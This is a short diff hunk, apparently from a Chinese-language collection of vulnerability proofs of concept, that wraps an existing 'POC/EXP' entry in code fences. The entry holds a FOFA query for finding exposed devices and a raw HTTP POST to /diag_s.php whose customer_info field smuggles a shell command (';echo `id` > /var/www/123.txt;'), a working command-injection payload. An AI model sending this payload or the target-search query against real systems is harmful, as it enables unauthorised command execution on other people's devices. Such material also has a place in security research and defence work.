@@ -80,6 +80,7 @@ FOFA：body="CACHE-CONTROL" && body="/js/cookiecontrol.js"
 
 POC/EXP：
 
+```http
 POST /diag_s.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
@@ -91,6 +92,8 @@ Accept-Encoding: gzip, deflate
 Content-Length: 12
 
 action=1&customer_info=;echo `id` > /var/www/123.txt;
+```
+
 
 
 
